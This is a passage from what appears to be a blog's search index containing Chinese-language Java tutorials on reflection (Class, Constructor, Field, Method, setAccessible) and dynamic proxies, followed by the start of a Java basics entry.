personClass.getMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">        actionMethod.invoke(person,<span class="string">&quot;Reflection&quot;</span>);</span><br><span class="line">        <span class="comment">// 输出 Reflection</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h4><p><strong>java.lang.Class类</strong></p><p>获取对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj.getClass();</span><br><span class="line">obj.class;</span><br><span class="line">Class.forName(obj);</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getName:获取全类名</span><br><span class="line">getSimpleName:获取简单类名</span><br><span class="line">getFields:获取所有public修饰的属性，包含本类以及父类的</span><br><span class="line">getDeclaredFields:获取本类中所有属性</span><br><span class="line">getMethods:获取所有public修饰的方法，包含本类以及父类的</span><br><span class="line">getDeclaredMethods:获取本类中所有方法</span><br><span class="line">getConstructors:获取本类所有public修饰的构造器</span><br><span class="line">getDeclaredConstructors:获取本类中所有构造器</span><br><span class="line">getPackage:以Package形式返回包信息</span><br><span class="line">getSuperClass:以Class形式返回父类信息</span><br><span class="line">getInterfaces:以Class[]形式返回接口信息</span><br><span class="line">getAnnotations:以Annotation[]形式返回注解信息</span><br></pre></td></tr></table></figure><h4 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h4><h5 id="获取无参构造方法"><a href="#获取无参构造方法" class="headerlink" title="获取无参构造方法"></a>获取无参构造方法</h5><p>Java 1.9 版本中被弃用，还可以用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">personClass.newInstance();</span><br><span class="line"><span class="comment">// 被 Constructor&lt;?&gt; 代替</span></span><br><span class="line"><span class="comment">// 使用 替换 Constructor&lt;?&gt; 部分</span></span><br></pre></td></tr></table></figure><h5 id="获取类的构造方法"><a href="#获取类的构造方法" class="headerlink" title="获取类的构造方法"></a>获取类的构造方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Class&lt;?&gt; </span></span><br><span class="line"><span class="comment">// 获取 Person 类的 Class 对象</span></span><br><span class="line">Class&lt;?&gt; personClass = Class.forName(<span class="string">&quot;net.Seck2y.a02.Person&quot;</span>);  <span class="comment">// 完整路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructor&lt;?&gt;</span></span><br><span class="line"><span class="comment">// 获取 Person 类的构造方法</span></span><br><span class="line">Constructor&lt;?&gt; constructor = personClass.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="comment">// Constructor&lt;?&gt;[] constructor = personClass.getConstructors(); // 获取所有构造方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 Person 对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">person</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;lisi&quot;</span>, <span class="number">24</span>);</span><br><span class="line"><span class="comment">// Person person = (Person) constructor.newInstance(&quot;lisi&quot;, 24);</span></span><br><span class="line">System.out.println(person);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 无重写 toString 返回地址</span></span><br><span class="line">net.Seck2y.a02.Person@4eec7777</span><br></pre></td></tr></table></figure><h4 id="Field"><a href="#Field" class="headerlink" title="Field"></a>Field</h4><blockquote><p><strong>(public)</strong></p><p><code>getField(String name)</code> 只能获取一个指定类或其父类中的公共字段</p><p><code>getFields()</code> 会返回一个包含所有公共字段的数组</p><p><strong>(public, private, protect)</strong></p><p><code>getDeclaredField(String name)</code> 只能获取指定类中的一个字段对象</p><p><code>getDeclaredFields() </code> 会返回一个包含所有字段的数组</p><p><strong>私有成员和方法，不能直接访问</strong></p><p><code>setAccessible(true)</code> 方法是用于打破访问限制的方法，它允许访问私有字段、私有方法和私有构造函数</p></blockquote><h5 id="获取成员属性的信息（无值）"><a href="#获取成员属性的信息（无值）" class="headerlink" title="获取成员属性的信息（无值）"></a>获取成员属性的信息（无值）</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取成员属性的信息（无值）</span></span><br><span class="line">Field[] personField = persClass.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span> (Field f:personField)&#123;</span><br><span class="line">    System.out.println(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="keyword">private</span> java.lang.String net.Seck2y.a02.Person.name</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> net.Seck2y.a02.Person.age</span><br></pre></td></tr></table></figure><h5 id="获取成员属性的名称和值"><a href="#获取成员属性的名称和值" class="headerlink" title="获取成员属性的名称和值"></a>获取成员属性的名称和值</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取成员属性的值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);  <span class="comment">// 提权</span></span><br><span class="line">ageField.setAccessible(<span class="literal">true</span>);   <span class="comment">// 提权</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) nameField.get(person);  <span class="comment">// 获取 nameField 属性的值</span></span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> (<span class="type">int</span>) ageField.get(person);          <span class="comment">// 获取 ageField 属性的值</span></span><br><span class="line">System.out.println(nameField.getName() + <span class="string">&quot;: &quot;</span> + name + <span class="string">&quot;, &quot;</span> + ageField.getName() + <span class="string">&quot;: &quot;</span> + age); <span class="comment">// getName 获取属性的名称</span></span><br><span class="line"><span class="comment">// System.out.println(person);  可替换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 name: lisi, age: 24</span></span><br></pre></td></tr></table></figure><h5 id="修改成员属性的值"><a href="#修改成员属性的值" class="headerlink" title="修改成员属性的值"></a>修改成员属性的值</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改 Person 对象的属性信息</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">setName</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">setAge</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">setName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">setAge.setAccessible(<span class="literal">true</span>);</span><br><span class="line">setName.set(person, <span class="string">&quot;wangwu&quot;</span>);  <span class="comment">// 修改 setName 所获取的成员属性值</span></span><br><span class="line">setAge.set(person, <span class="number">25</span>);         <span class="comment">// 修改 setAge 所获取的成员属性值</span></span><br><span class="line">System.out.println(setName.getName() + <span class="string">&quot;: &quot;</span> + setName.get(person) + <span class="string">&quot;, &quot;</span> + setAge.getName() + <span class="string">&quot;: &quot;</span> + setAge.get(person));</span><br><span class="line"><span class="comment">// System.out.println(person);  可替换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 name: wangwu, age: 25</span></span><br></pre></td></tr></table></figure><h4 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h4><blockquote><p><strong>(public)</strong></p><p><code>getMethod(String name, Class&lt;?&gt; ... perameterTypes)</code> 只能获取一个指定类或其父类中的公有方法</p><p><code>getMethods()</code> 会返回一个包含所有公有方法的数组</p><p><strong>(public, private, protect)</strong></p><p><code>getDeclaredMethod(String name, Class&lt;?&gt; ... perameterTypes)</code> 只能获取指定类中的一个方法</p><p><code>getDeclaredMethods() </code>会返回一个包含所有方法的数组</p><p><code>getEnclosingMethod() </code> 获取当前方法所属的类及方法信息，当一个方法被调用时，如果该方法不属于任何一个类的方法，或者属于一个静态方法，那么 <code>getEnclosingMethod()</code> 方法将返回 <code>null</code></p><p><strong>私有成员和方法，不能直接访问</strong></p><p><code>setAccessible(true)</code> 方法是用于打破访问限制的方法，它允许访问私有字段、私有方法和私有构造函数</p></blockquote><h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取方法</span></span><br><span class="line">Method[] personMethod = personClass.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span> (Method m: personMethod) &#123;</span><br><span class="line">    System.out.println(m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="keyword">public</span> java.lang.String net.Seck2y.a02.Person.toString()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> net.Seck2y.a02.Person.action(java.lang.String)</span><br></pre></td></tr></table></figure><p><code>getMethods</code>可以获取包括父类的共有方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> java.lang.String net.Seck2y.a02.Person.toString()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> net.Seck2y.a02.Person.action(java.lang.String)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> java.lang.Object.wait(<span class="type">long</span>,<span class="type">int</span>) <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> java.lang.Object.wait() <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> java.lang.Object.wait(<span class="type">long</span>) <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> java.lang.Object.equals(java.lang.Object)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> java.lang.Object.hashCode()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> java.lang.Class java.lang.Object.getClass()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> java.lang.Object.notify()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> java.lang.Object.notifyAll()</span><br></pre></td></tr></table></figure><h5 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h5><p>方法 action是 public修饰，getMethod() 和 getDeclaredMethod() 都可用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 Person 对象的方法信息并调用它们</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">actionMethod</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">actionMethod.invoke(person,<span class="string">&quot;Reflection&quot;</span>);</span><br><span class="line"><span class="comment">// 输出 Reflection</span></span><br></pre></td></tr></table></figure><p>如果方法是 private修饰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">actionMethod</span> <span class="operator">=</span> personClass.getDeclaredMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">actionMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">actionMethod.invoke(person,<span class="string">&quot;Reflection&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p><code>Java</code>反射提供了一种类动态代理机制，可以通过代理接口实现类来完成程序无侵入式扩展</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>Test</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        需求：</span></span><br><span class="line"><span class="comment">            外面的人想要大明星唱一首歌</span></span><br><span class="line"><span class="comment">             1. 获取代理的对象</span></span><br><span class="line"><span class="comment">                代理对象 = ProxyUtil.createProxy(大明星的对象);</span></span><br><span class="line"><span class="comment">             2. 再调用代理的唱歌方法</span></span><br><span class="line"><span class="comment">                代理对象.唱歌的方法(&quot;只因你太美&quot;);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">        <span class="comment">//1. 获取代理的对象</span></span><br><span class="line">        <span class="type">BigStar</span> <span class="variable">bigStar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigStar</span>(<span class="string">&quot;鸡哥&quot;</span>);</span><br><span class="line">        <span class="type">Star</span> <span class="variable">proxy</span> <span class="operator">=</span> ProxyUtil.createProxy(bigStar);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 调用唱歌的方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> proxy.sing(<span class="string">&quot;只因你太美&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ProxyUtil 代理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  类的作用：创建一个代理</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyUtil</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 方法的作用：给一个明星的对象，创建一个代理</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    *  形参：被代理的明星对象</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    *  返回值：给明星创建的代理</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * 需求：外面的人想要大明星唱一首歌</span></span><br><span class="line"><span class="comment">    *   1. 获取代理的对象</span></span><br><span class="line"><span class="comment">    *      代理对象 = ProxyUtil.createProxy(大明星的对象);</span></span><br><span class="line"><span class="comment">    *   2. 再调用代理的唱歌方法</span></span><br><span class="line"><span class="comment">    *      代理对象.唱歌的方法(&quot;只因你太美&quot;);</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Star <span class="title function_">createProxy</span><span class="params">(BigStar bigStar)</span>&#123;</span><br><span class="line">       <span class="comment">/* java.lang.reflect.Proxy类：提供了为对象产生代理对象的方法：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br><span class="line"><span class="comment">        参数一：用于指定用哪个类加载器，去加载生成的代理类</span></span><br><span class="line"><span class="comment">        参数二：指定接口，这些接口用于指定生成的代理长什么，也就是有哪些方法</span></span><br><span class="line"><span class="comment">        参数三：用来指定生成的代理对象要干什么事情</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">Star</span> <span class="variable">star</span> <span class="operator">=</span> (Star) Proxy.newProxyInstance(</span><br><span class="line">                ProxyUtil.class.getClassLoader(),<span class="comment">//参数一：用于指定用哪个类加载器，去加载生成的代理类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Star.class&#125;,<span class="comment">//参数二：指定接口，这些接口用于指定生成的代理长什么，也就是有哪些方法</span></span><br><span class="line">                <span class="comment">//参数三：用来指定生成的代理对象要干什么事情</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                        * 参数一：代理的对象</span></span><br><span class="line"><span class="comment">                        * 参数二：要运行的方法 sing</span></span><br><span class="line"><span class="comment">                        * 参数三：调用sing方法时，传递的实参</span></span><br><span class="line"><span class="comment">                        * */</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="string">&quot;sing&quot;</span>.equals(method.getName()))&#123;</span><br><span class="line">                            System.out.println(<span class="string">&quot;准备话筒，收钱&quot;</span>);</span><br><span class="line">                        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;dance&quot;</span>.equals(method.getName()))&#123;</span><br><span class="line">                            System.out.println(<span class="string">&quot;准备场地，收钱&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//去找大明星开始唱歌或者跳舞</span></span><br><span class="line">                        <span class="comment">//代码的表现形式：调用大明星里面唱歌或者跳舞的方法</span></span><br><span class="line">                        <span class="keyword">return</span> method.invoke(bigStar,args);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> star;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Star 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Star</span> &#123;</span><br><span class="line">    <span class="comment">//我们可以把所有想要被代理的方法定义在接口当中</span></span><br><span class="line">    <span class="comment">//唱歌</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">sing</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="comment">//跳舞</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">dance</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BigStar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BigStar</span> <span class="keyword">implements</span> <span class="title class_">Star</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BigStar</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BigStar</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sing</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">&quot;正在唱&quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;谢谢&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dance</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">&quot;正在跳舞&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;a</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BigStar&#123;name = &quot;</span> + name + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ProxyUtil 拦截方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyUtil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Star <span class="title function_">createProxy</span><span class="params">(BigStar bigStar)</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br><span class="line">        <span class="type">Star</span> <span class="variable">star</span> <span class="operator">=</span> (Star) Proxy.newProxyInstance(</span><br><span class="line">                ProxyUtil.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Star.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="string">&quot;cleanWC&quot;</span>.equals(method.getName()))&#123;</span><br><span class="line">                            System.out.println(<span class="string">&quot;拦截，不调用大明星的方法&quot;</span>);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//如果是其他方法，正常执行</span></span><br><span class="line">                        <span class="keyword">return</span> method.invoke(bigStar,args);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> star;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础</title>
      <link href="/2023/10/10/java/base/Java%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/10/10/java/base/Java%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><p><strong>编译运行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java源文件 -&gt; class字节码文件 -&gt; java运行class文件</span><br><span class="line">javac java文件  # 输出class字节码文件</span><br><span class="line">java class文件</span><br></pre></td></tr></table></figure><p><strong>Hello World</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWord</span> &#123;  <span class="comment">// 与文件名一致</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  <span class="comment">// 主函数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>主函数</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输入输出</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 